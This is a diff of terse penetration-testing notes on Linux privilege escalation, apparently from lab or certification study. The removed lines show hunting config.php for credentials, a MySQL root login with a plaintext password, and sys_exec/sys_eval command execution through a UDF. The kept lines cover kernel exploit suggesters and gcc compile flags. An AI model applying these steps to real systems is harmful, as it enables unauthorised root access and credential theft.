@@ -1,22 +1,10 @@
-THIS FILE IS ABOUT LINUX PRIV-ESC WITH DIFFERENT METHODS + JAILED SHELL ESCAPE METHODS
-Command | Description 
-------------------
-find . -name "config.php"
-get the credentials
-mysql -u root -p aCs2009offsec            
-use mysql;
-select sys_exec("whoami");
-select sys_eval('whoami');  
-
-# PHP and MySQL
-http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html
-===============
+# Kernel vulnerability. Don’t have to use exploit suggester exploitdb works just as well. 
+~~~
 1. Uname -a
 2. linux-exploit-suggester-2.pl -k <KERNEL_VERSION>
- 
 gcc <spoilers> -o exploit -Wl,--hash-style=both
 gcc -m32 -Wl,--hash-style=both
-
+~~~
 # Kernel vulnerability. Don’t have to use exploit suggester exploitdb works just as well. 
 This was rare in most instances, in the lab you do get some with vulnerable kernels. 
 The secret is to compile them correct as shown with the gcc commands.
